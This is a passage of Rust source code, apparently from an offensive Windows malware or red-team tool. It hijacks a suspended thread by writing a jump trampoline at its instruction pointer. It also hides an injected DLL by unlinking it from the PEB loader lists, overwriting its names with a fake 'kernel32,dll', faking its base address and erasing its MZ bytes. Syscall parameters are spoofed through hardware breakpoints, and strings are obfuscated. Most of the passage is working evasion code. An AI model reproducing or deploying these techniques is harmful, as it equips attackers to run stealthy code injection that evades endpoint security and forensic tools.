        return Err(anyhow::anyhow!(m!("failed to protect memory").to_owned()));
    }

    //4. construct and write the trampoline directly to RIP location
    let mut trampoline = [
        0x48, 0xB8,                 // movabs rax, ...
        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, // placeholder bytes
        0xFF, 0xE0                  // jmp rax
    ];

    let p_address_bytes: [u8; 8] = unsafe { std::mem::transmute(p_address as u64) };
    trampoline[2..10].copy_from_slice(&p_address_bytes);

    //write the trampoline to the RIP location
    let status_write_memory = nt_write_virtual_memory(
            h_process,
            context.Rip as *mut c_void,
            trampoline.as_ptr() as *mut c_void,
            trampoline.len() as SIZE_T,
            std::ptr::null_mut::<usize>(),
    );

    if !NT_SUCCESS(status_write_memory) {
        return Err(anyhow::anyhow!(m!("failed to write memory").to_owned()));
    }

    //5. Restore the original memory protection
    let _ =  nt_protect_virtual_memory(
            h_process,
            base_address,
            &mut original_memory.len() as *mut _,
            old_protect,
            &mut old_protect,
    );

    //optionallt flush the instruction cache
    nt_flush_instruction_cache(h_process, context.Rip as *mut c_void, trampoline.len() as SIZE_T);

    let status = nt_resume_thread(h_thread, std::ptr::null_mut::<ULONG>());
    if !NT_SUCCESS(status) {
        return Err(anyhow::anyhow!(format!("failed to resume thread: {:#X}", status)));
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(())
}

pub fn unlink_module(module_name: &str, process_id: u32) ->Result<(), anyhow::Error> {
    let process_handle = get_process_handle(process_id)?;

    let process_basic_info = get_process_basic_info(process_handle as*mut c_void)?;
    let peb: PEB = get_peb(process_handle as *mut c_void, process_basic_info)?;
    let ldr_data = get_peb_ldr_data(process_handle as *mut c_void, peb)?;

    let mut ldr_entry: DllDataTable = unsafe { std::mem::zeroed() };
    let current: *mut LIST_ENTRY = ldr_data.InLoadOrderModuleList.Flink;

    loop {
        let ldr_entry_address = (current as usize - offset_of!(DllDataTable, InLoadOrderLinks)) as *mut DllDataTable;
        let status = nt_read_virtual_memory(
            process_handle as *mut c_void,
            ldr_entry_address as PVOID,
            &mut ldr_entry as *mut DllDataTable as *mut c_void,
            size_of::<DllDataTable>() as usize,
            std::ptr::null_mut::<usize>(),
        );

        if status != 0 {
            return Err(anyhow::anyhow!(m!("failed to read LDR_DATA_TABLE_ENTRY").to_owned()));
        }

        let module_name_length = ldr_entry.BaseDllName.Length as usize;
        let mut module_name_vec = vec![0u16; module_name_length / 2];

        let status = nt_read_virtual_memory(
            process_handle as *mut c_void,
            ldr_entry.BaseDllName.Buffer as PVOID,
            module_name_vec.as_mut_ptr() as *mut c_void,
            module_name_length as usize,
            std::ptr::null_mut::<usize>(),
        );

        if status != 0 {
            return Err(anyhow::anyhow!(m!("failed to read module name").to_owned()));
        }

        let current_module_name_with_path = String::from_utf16_lossy(&module_name_vec).trim().to_lowercase();
        let current_module_name = std::path::Path::new(&current_module_name_with_path)
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or_default();

        let target_module_name = module_name.trim().to_lowercase();

        if current_module_name == target_module_name {
            if unlink_entry(process_handle as *mut c_void, ldr_entry.InLoadOrderLinks.Blink, ldr_entry.InLoadOrderLinks.Flink) {
            }else {
                return Err(anyhow::anyhow!(m!("failed to unlink InLoadOrderLinks").to_string()));
            }
            if unlink_entry(process_handle as *mut c_void, ldr_entry.InMemoryOrderLinks.Blink, ldr_entry.InMemoryOrderLinks.Flink) {
            } else {
                return Err(anyhow::anyhow!(m!("failed to unlink InMemoryOrderLinks").to_string()));
            }
            if unlink_entry(process_handle as *mut c_void, ldr_entry.InInitializationOrderLinks.Blink, ldr_entry.InInitializationOrderLinks.Flink) {
            } else {
                return Err(anyhow::anyhow!(m!("failed to unlink InInitializationOrderLinks").to_string()));
            }
            if unlink_entry(process_handle as *mut c_void, ldr_entry.HashTableEntry.Blink, ldr_entry.HashTableEntry.Flink) {
            } else {
                return Err(anyhow::anyhow!(m!("failed to unlink HashTableEntry").to_string()));
            }

            if !erase_dll_names(process_handle as *mut c_void, &ldr_entry) {
                //return Err(anyhow::anyhow!(m!("failed to erase DLL names").to_string()));
                panic!("{} {}", m!("failed to erase DLL names"), m!("exiting..."));
            }

            let ldr_entry_address = (current as usize - offset_of!(DllDataTable, InLoadOrderLinks)) as *mut DllDataTable;

            if !erase_dll_base(process_handle as *mut c_void, ldr_entry_address) {
                //return Err(anyhow::anyhow!(m!("failed to erase DLL base").to_string()));
                panic!("{} {}", m!("failed to erase DLL base"), m!("exiting..."));
            }

            if !erase_dos_magic_bytes(process_handle as *mut c_void, ldr_entry.DllBase as usize) {
                //return Err(anyhow::anyhow!(m!("failed to erase DOS magic bytes").to_string()));
                panic!("{} {}", m!("failed to erase DOS magic bytes"), m!("exiting..."));
            }

            dbg!("{} {}", m!("Module unlinked:"), current_module_name);
            nt_close(process_handle as *mut c_void);
            return Ok(());

        }

        if current == ldr_data.InLoadOrderModuleList.Flink {
            break Ok(());
        }

        return Err(anyhow::anyhow!(m!("failed to unlink module").to_string()));
    }


}

fn unlink_entry(process_handle: *mut c_void, prev_entry: *mut LIST_ENTRY, next_entry: *mut LIST_ENTRY) -> bool {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    
    //update prev_entry's Flink
    if !prev_entry.is_null() {
        let updated_flink_data: *mut LIST_ENTRY = next_entry;
        let write_status = unsafe {
            nt_write_virtual_memory(
                process_handle,
                &(*prev_entry).Flink as *const _ as PVOID,
                &updated_flink_data as *const _ as *mut c_void,
                std::mem::size_of_val(&updated_flink_data) as usize,
                std::ptr::null_mut::<usize>(),
            )    
        };

        if write_status != 0 {
            return false;
        }

    }
    //update next_entry's Blink
    if !next_entry.is_null() {
        let updated_blink_data: *mut LIST_ENTRY = prev_entry;
        let write_status = unsafe {
            nt_write_virtual_memory(
                process_handle,
                &(*next_entry).Blink as *const _ as PVOID,
                &updated_blink_data as *const _ as *mut c_void,
                std::mem::size_of_val(&updated_blink_data) as usize,
                std::ptr::null_mut::<usize>(),
            )
        };
        if write_status != 0 {
            return false;
        }
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    true

}

fn erase_dll_names(process_handle: *mut c_void, ldr_entry: &DllDataTable) -> bool {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let fake_dll_name: Vec<u16> = "kernel32,dll\0".encode_utf16().collect::<Vec<u16>>();
    let full_name_length = ldr_entry.FullDllName.Length as usize;
    let mut fake_name_vec = fake_dll_name.repeat(full_name_length / fake_dll_name.len());

    let status = nt_write_virtual_memory(
        process_handle,
        ldr_entry.FullDllName.Buffer as PVOID,
        fake_name_vec.as_mut_ptr() as *mut c_void,
        full_name_length as usize,
        std::ptr::null_mut::<usize>(),
    );

    if status != 0 {
        return false;
    }

    let base_name_length = ldr_entry.BaseDllName.Length as usize;
    let mut fake_base_name_vec = fake_dll_name.repeat(base_name_length / fake_dll_name.len());

    let status = nt_write_virtual_memory(
        process_handle,
        ldr_entry.BaseDllName.Buffer as PVOID,
        fake_base_name_vec.as_mut_ptr() as *mut c_void,
        base_name_length as usize,
        std::ptr::null_mut::<usize>(),
    );

    if status != 0 {
        return false;
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    true
}

fn erase_dll_base(process_handle: *mut c_void, ldr_entry_address: *mut DllDataTable) -> bool {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let fake_dll_base = 0x7FFF0000 as PVOID;
    let status = unsafe {
        nt_write_virtual_memory(
            process_handle,
            &(*ldr_entry_address).DllBase as *const _ as PVOID,
            &fake_dll_base as *const _ as *mut c_void,
            std::mem::size_of_val(&fake_dll_base) as usize,
            std::ptr::null_mut::<usize>(),
        )
    };
    if status != 0 {
        return false;
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    true
}

fn erase_dos_magic_bytes(process_handle: *mut c_void, module_base: usize) -> bool {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);


    //offset to the DOS magic bytes ath the start of the module
    let mut magic_offset: usize = module_base;

    //size of the magic bytes
    let mut magic_size: usize = 2usize; //"MZ" is 2 bytes

    //change the memory protection to PAGE_READWRITE
    let mut old_perms: u32 = 0;
    let protect_status = nt_protect_virtual_memory(
        process_handle,
        &mut magic_offset as *mut _ as *mut PVOID,
        &mut magic_size,
        PAGE_READWRITE,
        &mut old_perms,
    );
     if protect_status != 0 {
        panic!("{}", m!("Failed to change memory protection"));
     }

     //create abuffer to zero out only the 2 magic bytes
     let zeroed_magic_vec = [0u8; 2];
     let status = nt_write_virtual_memory(
         process_handle,
         &mut magic_offset as *mut _ as PVOID,
         zeroed_magic_vec.as_ptr() as *mut c_void,
         magic_size,
         std::ptr::null_mut::<usize>(),
     );

     //revert protection to original state
     let _ = nt_protect_virtual_memory(
         process_handle,
         &mut magic_offset as *mut _ as *mut PVOID,
         &mut magic_size,
         old_perms,
         &mut old_perms,
     );

     dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

     //return fasle if the write failed

     status == 0

}
   


fn get_process_basic_info(process_handle: HANDLE) -> Result<PROCESS_BASIC_INFORMATION, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe {std::mem::zeroed::<PROCESS_BASIC_INFORMATION>()};
    let mut return_length: u32 = 0;

    let status = nt_query_information_process(
        process_handle as *mut c_void,
        ProcessBasicInformation,
        &mut process_basic_info as *mut PROCESS_BASIC_INFORMATION as *mut c_void,
        size_of::<PROCESS_BASIC_INFORMATION> as u32,
        &mut return_length,
    );

    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to query info process").to_owned()));
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(process_basic_info)
}

fn get_peb(process_handle: HANDLE, process_basic_info: PROCESS_BASIC_INFORMATION) -> Result<PEB, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    //read the PEB from the process memory
    let pbi: *mut PEB = process_basic_info.PebBaseAddress;
    let mut peb: PEB = unsafe { std::mem::zeroed::<PEB>() };

    let status = nt_read_virtual_memory(
        process_handle as *mut c_void,
        pbi as PVOID,
        &mut peb as *mut PEB as *mut c_void,
        size_of::<PEB>() as usize,
        std::ptr::null_mut::<usize>(),
    );

    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to read PEB").to_owned()));
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(peb)
    
}

fn get_peb_ldr_data(process_handle: HANDLE, peb: PEB) -> Result<PEB_LDR_DATA, anyhow::Error> {

    //activate use of hardware breakpoints to spoof syscall params
    dinvoke_rs::dinvoke::use_hardware_breakpoints(true);
    //we get the value of the memory at the address and set it as a VEH
    let handler = dinvoke_rs::dinvoke::breakpoint_handler as usize;
    dinvoke_rs::dinvoke::add_vectored_exception_handler(1, handler);

    //read the PEB_LDR_DATA from the process memory
    let mut ldr_data: PEB_LDR_DATA = unsafe { std::mem::zeroed::<PEB_LDR_DATA>() };

    let status = nt_read_virtual_memory(
        process_handle as *mut c_void,
        peb.Ldr as PVOID,
        &mut ldr_data as *mut PEB_LDR_DATA as *mut c_void,
        size_of::<PEB_LDR_DATA>() as usize,
        std::ptr::null_mut::<usize>(),
    );

    if status != 0 {
        return Err(anyhow::anyhow!(m!("failed to read PEB LDR").to_owned()));
    }

    dinvoke_rs::dinvoke::use_hardware_breakpoints(false);

    Ok(ldr_data)
}

